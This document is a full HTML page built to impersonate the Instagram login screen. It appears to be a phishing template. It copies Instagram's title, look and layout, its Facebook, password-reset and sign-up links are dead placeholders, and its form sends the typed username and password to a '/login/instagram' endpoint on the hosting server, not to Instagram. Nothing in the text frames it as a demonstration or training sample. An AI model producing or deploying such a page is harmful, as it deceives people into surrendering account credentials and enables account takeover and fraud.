<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
        .ig-box{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:40px 30px;width:350px}
        .ig-box h1{text-align:center;font-size:40px;margin-bottom:30px;background:linear-gradient(45deg,#f58529,#dd2a7b,#8134af);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        input{width:100%;padding:9px 8px;margin:3px 0;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:14px}
        input:focus{border-color:#a8a8a8;outline:none}
        button{width:100%;padding:7px 16px;margin:12px 0 8px;background:#0095f6;border:none;border-radius:4px;color:#fff;font-size:14px;font-weight:600;cursor:pointer}
        button:hover{background:#1877f2}
        .divider{display:flex;align-items:center;margin:15px 0;color:#8e8e8e;font-size:13px}
        .divider::before,.divider::after{content:"";flex:1;border-bottom:1px solid #dbdbdb;margin:0 10px}
        .fb-login{text-align:center;margin:10px 0}
        .fb-login a{color:#385185;text-decoration:none;font-size:14px;font-weight:600}
        .forgot{text-align:center;margin:15px 0 0}
        .forgot a{color:#00376b;text-decoration:none;font-size:12px}
        .signup{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:20px;width:350px;text-align:center;margin-top:10px}
        .signup a{color:#0095f6;font-weight:600;text-decoration:none}
    </style>
</head>
<body>
<div>
    <div class="ig-box">
        <h1>Instagram</h1>
        <form method="POST" action="/login/instagram">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="divider">OR</div>
        <div class="fb-login"><a href="#">Log in with Facebook</a></div>
        <div class="forgot"><a href="#">Forgot password?</a></div>
    </div>
    <div class="signup"><p>Don't have an account? <a href="#">Sign up</a></p></div>
</div>
</body>
</html>
